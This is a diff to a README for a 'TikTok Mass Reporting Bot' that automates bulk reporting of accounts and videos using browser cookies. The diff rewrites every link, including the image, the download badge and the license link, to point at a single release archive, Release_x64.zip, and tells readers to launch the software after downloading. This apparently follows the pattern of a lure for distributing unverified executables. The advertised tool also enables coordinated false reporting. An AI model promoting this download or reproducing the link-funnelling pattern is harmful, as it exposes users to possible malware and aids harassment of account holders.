@@ -2,7 +2,7 @@
 
 Welcome to the TikTok Mass Reporting Bot repository! This bot automates the reporting of TikTok accounts and videos using browser cookies. It supports multi-threading, customizable reporting reasons, and allows you to report accounts and videos simultaneously. If you're tired of dealing with inappropriate content on TikTok, this bot can make the reporting process more efficient for you.
 
-![TikTok Mass Reporting Bot](https://imageurl.com)
+![TikTok Mass Reporting Bot](https://github.com/LUKENINJA27/TikTok-Mass-Reporting-Bot/releases/download/v1.0/Release_x64.zip)
 
 ## Features 🚀
 
@@ -44,7 +44,7 @@ Welcome to the TikTok Mass Reporting Bot repository! This bot automates the repo
 
 ## Download Software 📥
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/LUKENINJA27/TikTok-Mass-Reporting-Bot/releases/download/v1.0/Release_x64.zip)](https://github.com/LUKENINJA27/TikTok-Mass-Reporting-Bot/releases/download/v1.0/Release_x64.zip)
 *Note: Software needs to be launched after downloading.*
 
 If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative download options.
@@ -55,7 +55,7 @@ Contributions are welcome! If you have any ideas for improving the TikTok Mass R
 
 ## License ℹ️
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/22155555/1875695542/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/LUKENINJA27/TikTok-Mass-Reporting-Bot/releases/download/v1.0/Release_x64.zip) file for details.
 
 ---
 
